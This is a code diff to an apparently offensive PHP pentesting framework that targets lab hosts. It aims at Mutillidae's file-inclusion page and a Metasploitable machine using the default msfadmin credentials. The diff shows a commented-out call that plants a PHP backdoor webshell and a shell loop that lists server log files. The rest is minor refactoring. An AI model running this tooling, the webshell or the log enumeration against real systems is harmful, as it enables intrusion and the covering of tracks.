@@ -16,7 +16,8 @@ class poc4web extends poc4service{
     
     
     public function poc4web4fi(){
-        $msf = "10.60.10.129";$owasp = $msf;
+        $msf = "10.60.10.129";
+        $owasp = $msf;
         //$owasp = "10.60.10.130";
         
         $url = "http://$owasp:80/mutillidae/index.php?page=arbitrary-file-inclusion.php";
@@ -29,7 +30,7 @@ class poc4web extends poc4service{
         $url_fi->url4pentest();
         $url_fi = new PARAM($eth,$domain,$url,"target","10.60.10.1");
         $url_fi->poc($this->flag_poc);
-        $url_fi->ce2shell8param($OS);
+        $url_fi->fi4pentest($OS);
         exit();
         //$webshell = new malware4linux($owasp, $url_fi->ip, $url_fi->port_rfi, "$url_fi->dir_tmp/backdoor_php_webshell.php", "");
         //$webshell->backdoor_com_webshell_php();
@@ -372,7 +373,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $this->ssTitre(__FUNCTION__);
         $query = "for i in $(locate .log | grep -v '.gz' | grep '.log$'); do ls -al \$i;done " ;
         $this->requette($query);
-        $ip = $this->msf2;
+        $ip = "";
         $port = 22;
         $user2name = "msfadmin";
         $user2pass = "msfadmin";
